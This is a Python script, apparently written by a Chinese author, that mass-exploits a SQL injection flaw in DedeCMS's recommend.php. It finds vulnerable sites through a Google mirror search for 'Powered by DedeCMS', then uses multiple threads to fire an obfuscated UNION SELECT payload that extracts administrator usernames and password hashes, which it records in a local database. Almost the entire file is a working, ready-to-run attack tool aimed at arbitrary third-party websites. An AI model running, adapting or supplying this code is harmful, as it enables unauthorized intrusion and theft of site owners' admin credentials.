#!usr/bin/env python
#encoding:gbk
#version:0.9
#author:TinyMin
#email:1072571473@qq.com

import re
import requests
import sqlite3
import urllib
import threading

"""
本程序是织梦 dedecms recommand.php 的注入漏洞自动化利用工具。
1）使用google镜像来搜索漏洞网站因此镜像可能过段时间就不管用了，那时候只要稍作修改“使用google镜像抓取的配置信息”就行了。
2）程序有些边界设置没有考虑，比如google搜索页数没有上限；子线程不停的进行select没有考虑到数据库记录为空的情况等；
3）由于python的GIL锁所以python不支持真的多线程，不过本程序并不是计算密集型程序，所以这也没关系，不过最好还是多进程+协程。
"""
####################################################################################################
#以下是使用google镜像抓取的配置信息
GOOGLE_MIRROR   = 'https://g.chenjx.cn/'
GOOGLE_PREFIX   ='search?q='
GOOGLE_SUFFIX   ='&start='
GOOGLE_KEYWORDS = 'intext:Powered by DedeCMS'
URL = "%s%s%s%s" % (GOOGLE_MIRROR, GOOGLE_PREFIX, urllib.quote(GOOGLE_KEYWORDS), GOOGLE_SUFFIX)
HEAD = {
    'Host': 'g.chenjx.cn',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate, br',
    'DNT': '1',
    'Referer': 'https://g.chenjx.cn/',
    'Connection': 'keep-alive',
}

#exp
EXP_STRING = """/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\\%27%20or%20mid=@`\\%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`%20limit+0,1),5,6,7,8,9%23@`\\%27`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=4294"""

#线程数（python不支持真多线程，不过这个程序不是计算密集型不需要多个cpu，假多线程也是可以提高效率的??，不过最好的还是多进程加协程）
THREAD_NUMBER = 10

#预处理抓取的网页，方便正则编写
FIX = (
    ('<b>', ''),
    ('</b>', ''),
    ('<cite class="_Rm bc">', '<cite class="_Rm">')
)

#从处理后的页面中抓取网页链接
match     = re.compile(r'<cite class="_Rm">(([0-9a-zA-Z\-_]+?\.)+\w+)/?')

#抓取管理员用户名密码
match_pwn = re.compile(r'\|(.+?\|[a-z0-9]+)</h2>')

#goole搜索时候指定google搜索的第几页（一次+10 从0开始）
page = 0

#连接对象
conn =False

#游标对象
cursor = False

google = requests.get

#线程锁
lock = threading.Lock()

#貌似sqlite不支持多线程共享conn/cursor，所以加个锁
def syn_execute(sql):
    global conn
    global cursor
    global lock
    lock.acquire()
    try:
        _ = conn.execute(sql)
        conn.commit()
        return _
        #return cursor.execute(sql)
    finally:
        lock.release()

#线程所执行的代码
def exp(conn):
    _ = ''
    while True:
        _ = syn_execute("SELECT URL FROM dedecms_recommand where CHECKED = 0 LIMIT 0,1").fetchall()[0][0]
        syn_execute("UPDATE dedecms_recommand set CHECKED = 1 where URL = '%s'"%_)
        #print threading.currentThread(), _
        try:
            result = google('http://%s%s'% (_, EXP_STRING) ).content
            tmp = match_pwn.findall(result)
            if len(tmp)>0:
                print threading.currentThread(), tmp[0]
                syn_execute("UPDATE dedecms_recommand SET PWN = '%s' WHERE URL = '%s'" % (tmp[0], _))
        except:
            try:
                result = google('https://%s%s'% (_, EXP_STRING) ).content
                tmp = match_pwn.findall(result)
                if len(tmp)>0:
                    print threading.currentThread(), tmp[0]
                    syn_execute("UPDATE dedecms_recommand SET PWN = '%s' WHERE URL = '%s'" % (tmp[0], _))
            except:
                print threading.currentThread(), "can't get ", _


def main():
    # 初始化数据库
    global page
    global conn
    global cursor
    try:
        conn = sqlite3.connect("dedecms_recommand.db", check_same_thread = False)
        conn.execute("""
          CREATE TABLE IF NOT EXISTS dedecms_recommand(
          URL TEXT,
          CHECKED INTEGER,
          PWN TEXT);""")
        conn.commit()
        cursor = conn.cursor()
    except:
        print "can't connect to table"
    #开启线程用来做漏洞验证
    for i in range(THREAD_NUMBER):
        checker = threading.Thread(target=exp, name='exp_%d'%i, args = (cursor,))
        checker.start()

    #主线程用来不停的寻找可能目标
    while True:
        url = "%s%d" % (URL, page)
        try:
            result = google(url,headers=HEAD).content
            for i in FIX:
                result = result.replace(i[0], i[1])
        except:
            print "can't google!", url
        page += 10
        #print zip(*match.findall(result))
        tmp = match.findall(result)
        if len(tmp)<1: continue
        for i in zip(*tmp)[0]:
            sql = r"SELECT * FROM dedecms_recommand WHERE URL = '%s'" % i
            x=syn_execute(sql).fetchall()
            if len(x) <1:
                syn_execute("INSERT INTO dedecms_recommand(URL, CHECKED, PWN) VALUES('%s', 0, '')"%(i))



if __name__=='__main__':
    main()